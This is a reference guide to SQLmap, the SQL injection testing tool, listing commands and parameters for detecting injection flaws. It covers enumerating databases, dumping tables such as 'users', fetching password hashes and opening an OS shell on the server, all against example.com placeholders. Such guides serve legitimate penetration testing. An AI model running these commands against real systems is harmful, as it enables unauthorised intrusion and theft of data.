# SQLmap

SQLmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. It offers a powerful engine to perform a wide range of SQL injection attacks on various types of database management systems.

#### Basic Usage

*   **Command Line Execution:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1"
    ```

    This command tells SQLmap to test the URL for SQL injection vulnerabilities.

#### Common Features

*   **Database Enumeration:** SQLmap can enumerate database users, user hashes, privileges, roles, databases, tables, and columns:

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --dbs
    ```

    This command lists all the databases managed by the database server.
*   **Data Extraction:** Once a database has been selected, SQLmap can extract data from it:

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables
    ```

    This lists all the tables in the specified database.
*   **Command Execution:** If the SQL injection vulnerability leads to remote code execution, SQLmap can be used to execute commands on the underlying operating system:

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --os-shell
    ```

    This prompts SQLmap to attempt to open an OS shell on the database server.

#### Advanced Features

*   **Testing Specific SQL Injection Types:** SQLmap allows users to specify types of SQL injection tests (e.g., boolean-based blind, time-based blind):

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --technique=B
    ```
*   **Custom Injection Points:** Users can also specify custom injection points and parameter types (GET, POST, Cookie):

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --data="data to include in POST"
    ```
*   **Automated Request File Creation:** SQLmap can generate a request file based on captured HTTP requests:

    ```bash
    sqlmap -r request.txt
    ```



The `--dump` and `-p` parameters in SQLmap are used to enhance and specify the behavior of SQL injection testing. Here’s a brief overview of each:

#### `-p` Parameter

The `-p` parameter allows you to specify which parameter SQLmap should test for SQL injection vulnerabilities. This is useful when a URL or request contains multiple parameters, and you want to focus the testing on a specific parameter that is more likely to be vulnerable or you suspect is vulnerable based on observations or error responses.

*   **Usage Example:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1&ref=article" -p id
    ```

    In this command, SQLmap will specifically test the `id` parameter in the URL for SQL injection.

#### `--dump` Parameter

The `--dump` parameter is used to retrieve and display data from the database once SQLmap has confirmed that a SQL injection vulnerability exists. It's particularly useful for extracting information such as usernames, passwords, and other sensitive data from the database tables.

*   **Usage Example:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --dump -T users
    ```

    This command tells SQLmap to dump the contents of the `users` table. You can further specify databases and columns if necessary to narrow down the data extraction to relevant information.



#### Here’s a summary of some of the commonly used SQLmap parameters:

#### Target:

* `-u`, `--url`: Target URL (e.g., "http://www.site.com/vuln.php?id=1").
* `-d`, `--direct`: Connection string for direct database connection.
* `-l`, `--log-file`: Parse target URLs from a log file.
* `-x`, `--sitemap-url`: Parse target URLs from the sitemap.xml.
* `-m`, `--bulk-file`: Scan multiple targets enlisted in a given file.
* `-r`, `--request`: Load HTTP request from a file.

#### Request:

* `--data`: Data string to be sent through POST.
* `--cookie`: HTTP Cookie header.
* `--random-agent`: Use randomly selected HTTP User-Agent header.
* `--proxy`: Use a proxy to connect to the target URL.
* `--headers`: Extra headers (e.g., "X-Forwarded-For: 127.0.0.1").
* `--auth-type`, `--auth-cred`: HTTP authentication type (Basic, Digest) and credentials (username:password).

#### Injection:

* `-p`, `--param`: Testable parameter(s).
* `--dbms`: Force back-end DBMS to this value.
* `--os`: Force back-end DBMS operating system to this value.
* `--risk`: Risk level (1-3, default 1).
* `--level`: Level of tests to perform (1-5, default 1).
* `--technique`: SQL injection techniques to use (e.g., "BEC").

#### Detection:

* `--string`: String to match when query is true.
* `--not-string`: String to match when query is false.
* `--regexp`: Regexp to match when query is true.
* `--code`: HTTP code to match when query is true.

#### Techniques:

* `--time-sec`: Seconds to delay the DBMS response.
* `--union-cols`: Range of columns to test for UNION query SQL injection.
* `--union-char`: Character to use for bruteforcing number of columns.

#### Enumeration:

* `-a`, `--all`: Retrieve everything.
* `-b`, `--banner`: Fetch DBMS banner.
* `--current-user`: Fetch DBMS current user.
* `--current-db`: Fetch DBMS current database.
* `--passwords`: Enumerate DBMS users password hashes.
* `--tables`: Enumerate DBMS database tables.
* `--columns`: Enumerate DBMS database table columns.
* `--schema`: Enumerate DBMS schema.
* `--dump`: Dump DBMS database table entries.
* `--dump-all`: Dump all DBMS databases tables entries.

#### Miscellaneous:

* `--batch`: Never ask for user input, use the default behavior.
* `--flush-session`: Flush session files for current target.
* `--wizard`: Simple wizard interface for beginner users.

